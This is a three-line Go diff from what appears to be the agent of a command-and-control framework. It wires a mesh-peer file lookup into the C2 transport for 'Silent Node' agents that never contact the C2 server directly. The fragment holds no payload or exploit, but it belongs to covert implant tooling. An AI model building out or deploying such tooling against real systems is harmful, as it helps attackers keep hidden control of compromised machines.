@@ -126,6 +126,7 @@ func agent_main() {
 		meshCtx, meshCancel := context.WithCancel(context.Background())
 		defer meshCancel()
 		mesh.Start(meshCtx)
+		c2transport.PeerFileProvider = mesh.GetPeersForFile
 
 		if !common.RuntimeConfig.IsDirectC2Enabled {
 			// Silent Node: never contact C2 directly.
